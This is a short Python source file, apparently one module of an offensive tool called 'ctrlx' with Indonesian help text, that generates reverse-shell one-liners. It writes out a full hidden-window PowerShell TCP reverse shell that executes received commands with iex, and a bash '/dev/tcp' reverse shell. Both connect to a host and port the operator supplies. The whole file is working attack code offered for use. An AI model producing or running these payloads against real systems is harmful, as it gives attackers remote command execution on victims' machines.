import argparse

def generate_ps1(lhost, lport):
    payload = (
        f'powershell -nop -w hidden -c "$client = New-Object Net.Sockets.TCPClient(\'{lhost}\',{lport});'
        f'$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0)'
        f'{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
        f'$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';'
        f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);'
        f'$stream.Flush()}};$client.Close()"'
    )
    return payload

def generate_bash(lhost, lport):
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx axt --type s1n",
        description="Generate reverse shell one-liner (PowerShell or Bash)",
        epilog="Contoh: python ctrlx.py axt --type s1n --platform ps1 --lhost 127.0.0.1 --lport 9001 --save"
    )

    parser.add_argument("--platform", choices=["ps1", "bsh"], required=True, help="Jenis stager: ps1 atau bsh")
    parser.add_argument("--lhost", required=True, help="LHOST")
    parser.add_argument("--lport", required=True, help="LPORT")

    args = parser.parse_args(raw_args)

    if args.platform == "ps1":
        return generate_ps1(args.lhost, args.lport)
    else:
        return generate_bash(args.lhost, args.lport)
